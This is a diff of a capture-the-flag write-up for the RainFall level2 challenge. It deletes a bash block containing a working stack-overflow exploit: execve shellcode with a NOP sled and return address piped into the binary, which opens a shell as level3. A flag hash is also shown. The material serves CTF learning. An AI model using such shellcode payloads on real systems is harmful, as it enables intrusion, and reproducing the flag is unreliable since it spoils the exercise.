@@ -89,15 +89,6 @@ level3
 
 </details>
 
-```bash
-level2@RainFall:~$ python2 -c 'print "\x90"*43 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*16 + "\x08\xa0\x04\x08"' > /var/crash/shellcode.exploit
-level2@RainFall:~$ cat /var/crash/shellcode.exploit - | ./level2
-�������������������������������������������j
-                                            X�Rh//shh/bin��1��aaaaaaaaaaa�
-whoami
-level3
-```
-
 ## Flag
 
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
